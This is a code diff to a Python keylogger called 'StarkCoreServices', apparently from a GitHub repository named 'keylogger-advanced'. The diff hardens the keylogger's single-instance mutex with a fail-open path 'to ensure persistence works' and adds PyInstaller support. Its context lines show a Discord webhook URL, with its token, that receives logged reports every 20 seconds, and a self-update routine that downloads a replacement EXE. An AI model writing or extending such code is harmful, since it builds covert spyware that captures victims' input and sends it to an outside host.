@@ -15,6 +15,12 @@ from datetime import datetime
 
 import subprocess
 
+import multiprocessing
+
+# CORE SECURITY: PREVENT RECURSIVE SPAWNING
+# Essential for PyInstaller + pynput/multiprocessing libraries
+multiprocessing.freeze_support()
+
 try:
     # CORE IMPORTS
     try:
@@ -57,16 +63,26 @@ except Exception as e:
 
 
 
-# SINGLE INSTANCE LOCK
+# SINGLE INSTANCE LOCK (FAIL SAFE)
 # This prevents the "Endless Opening" issue by ensuring only ONE instance runs.
 try:
     kernel32 = ctypes.windll.kernel32
-    # Removed "Global\\" prefix to avoid Access Denied on standard accounts
-    mutex = kernel32.CreateMutexW(None, False, "StarkCoreServices_Mutex_v22_Local")
-    if kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
+    # Local mutex to avoid permissions issues
+    mutex = kernel32.CreateMutexW(None, False, "StarkCoreServices_Mutex_v23_Local")
+    
+    # Check if mutex already exists (Error 183)
+    # ALSO check if mutex handle creation failed completely (0)
+    last_error = kernel32.GetLastError()
+    
+    if last_error == 183: # ERROR_ALREADY_EXISTS
         sys.exit(0)
-except Exception:
+        
+except Exception as e:
+    # Failsafe: If we can't create a mutex, we might be unstable.
+    # But in this case, we default to running (Fail Open) to ensure persistence works
+    # EXCEPT if we suspect we are a recursive child
     pass 
+ 
 
 # ... (omitted code) ...
 
@@ -74,7 +90,7 @@ finally:
     # Use the user-provided Discord Webhook URL
     WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "2.2"
+    VERSION = "2.3"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
